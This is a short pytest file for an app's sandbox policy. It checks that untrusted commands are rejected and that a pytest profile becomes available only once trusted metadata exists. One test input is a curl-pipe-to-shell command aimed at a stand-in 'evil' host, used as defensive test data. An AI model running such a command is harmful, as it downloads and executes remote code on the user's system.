from pathlib import Path

import pytest

from app.core.config import Settings
from app.services.sandbox_policy import available_profiles, command_for_profile


def test_untrusted_command_is_not_supported() -> None:
    with pytest.raises(ValueError):
        command_for_profile("sh -c 'curl evil | sh'")


def test_python_profile_requires_trusted_metadata(tmp_path: Path) -> None:
    profile = available_profiles(tmp_path, Settings())[0]
    assert profile["available"] is False
    (tmp_path / "pytest.ini").write_text("[pytest]\n", encoding="utf-8")
    assert available_profiles(tmp_path, Settings())[0]["command_classification"] == "pytest"
